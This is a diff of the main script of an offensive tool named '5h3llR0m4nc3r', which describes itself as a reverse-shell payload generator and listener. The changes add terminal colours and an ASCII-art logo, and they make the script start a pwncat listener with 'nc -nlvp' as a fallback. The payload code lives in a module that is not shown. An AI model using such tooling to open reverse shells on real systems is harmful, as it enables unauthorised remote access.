@@ -1,14 +1,42 @@
+#!/usr/bin/python3
+
 import payload
-import art
-from colorama import Fore as fore
 import sys
 import time
 import os
 
-art.tprint("5h3llR0m4nc3r",font="medium")
+class bcolors:
+
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    RED = '\033[31m'
+    YELLOW = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    BGRED = '\033[41m'
+    WHITE = '\033[37m'
+
+
+logo = """
+ _______  __   __  _______  ____   ____   ______    _______  __   __  _   ___  __    _  _______  _______  ______   
+|       ||  | |  ||       ||    | |    | |    _ |  |  _    ||  |_|  || | |   ||  |  | ||       ||       ||    _ |  
+|   ____||  |_|  ||___    | |   |  |   | |   | ||  | | |   ||       || |_|   ||   |_| ||       ||___    ||   | ||  
+|  |____ |       | ___|   | |   |  |   | |   |_||_ | | |   ||       ||       ||       ||       | ___|   ||   |_||_ 
+|_____  ||       ||___    | |   |  |   | |    __  || |_|   ||       ||___    ||  _    ||      _||___    ||    __  |
+ _____| ||   _   | ___|   | |   |  |   | |   |  | ||       || ||_|| |    |   || | |   ||     |_  ___|   ||   |  | |
+|_______||__| |__||_______| |___|  |___| |___|  |_||_______||_|   |_|    |___||_|  |__||_______||_______||___|  |_|
+"""
+
+print(bcolors.RED)
+print(logo)
+#print(bcolors.ENDC)
+
 
 print("ReverseShell payload generator")
 print("and Listening")
+
+print(bcolors.ENDC)
 
 banner = """
 
@@ -30,7 +58,10 @@ banner = """
 """
 
 time.sleep(1)
+
+print(bcolors.GREEN)
 print(banner)
+print(bcolors.ENDC)
 
 prompt = "5h311@R0m4nc3r:~$ "
 
@@ -72,12 +103,19 @@ if mode == "8":
 if mode == "9":
     cmd = payload.golang(host,port)
 
+print(bcolors.RED)    
 print("-"*20)
 print(" "*2)
+print(bcolors.ENDC)
 print(cmd)
+print(bcolors.RED)
 print(" "*2)
 print("-"*20)
+print(bcolors.ENDC)
 
+try:
+    os.system("pwncat -l "+port)
 
-os.system("nc -nlvp "+port)
+except:
+    os.system("nc -nlvp "+port)
 
